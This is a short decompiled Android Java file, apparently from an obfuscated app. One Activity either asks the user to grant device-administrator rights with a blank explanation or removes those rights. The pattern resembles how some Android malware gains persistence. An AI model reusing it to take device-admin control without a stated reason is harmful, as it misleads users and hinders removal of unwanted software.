package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0039c;

/* renamed from: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.a.b */
public class C0065b extends Activity {

    /* renamed from: a */
    C0039c f488a = new C0039c();

    /* renamed from: b */
    private C0066c f489b;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f489b = new C0066c(this);
        if (getIntent().getStringExtra("str").equals("start")) {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", this.f489b.mo362a());
            this.f488a.getClass();
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "");
            startActivityForResult(intent, 100);
        } else {
            ((DevicePolicyManager) getSystemService("device_policy")).removeActiveAdmin(new ComponentName(this, C0064a.class));
        }
        finish();
    }
}
